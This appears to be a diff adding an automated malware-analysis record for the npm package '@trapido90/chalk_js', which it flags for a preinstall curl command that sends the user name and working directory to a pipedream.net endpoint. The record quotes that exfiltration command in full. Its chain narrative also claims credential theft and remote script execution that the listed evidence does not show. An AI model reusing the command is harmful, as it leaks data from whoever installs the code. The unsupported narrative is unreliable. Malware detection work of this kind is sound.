@@ -1,0 +1,55 @@
+{
+  "package_name": "@trapido90/chalk_js",
+  "version": "5.2.2",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "data_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "data_exfiltration",
+        "summary": "The package sends data to an external server during the installation process.",
+        "details": "The package sends data to an external server during the installation process using a curl command in the preinstall script.",
+        "confidence": 0.83,
+        "evidence_apis": [],
+        "evidence_files": [],
+        "evidence_domains": [
+          "https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)"
+        ],
+        "evidence_commands": [
+          "curl https://61a54ccc098beb1b94e949de0d110344.m.pipedream.net/new/$(whoami)/$(pwd)"
+        ],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "that the package is likely involved in data exfiltration. The package sends data to an external server during the installation process using a curl command in the preinstall script. The confidence score is 0.83, indicating a high level of confidence in the detection of malicious intent."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials, POST to external domain, install hook downloads remote script, executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package sends data to an external server during the installation process using a curl command in the pre-install script. The confidence score is 0.83, indicating a high level of confidence in the detection of malicious intent.",
+      "legitimacy_score": 0.83
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.81,
+      "explanation": "The package is likely involved in data exfiltration. The package sends data to an external server during the installation process using a curl command in the pre-install script. The confidence score is 0.81, indicating a high level of confidence in the verification of the malicious intent."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.7773,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T09:57:42.254812"
+}
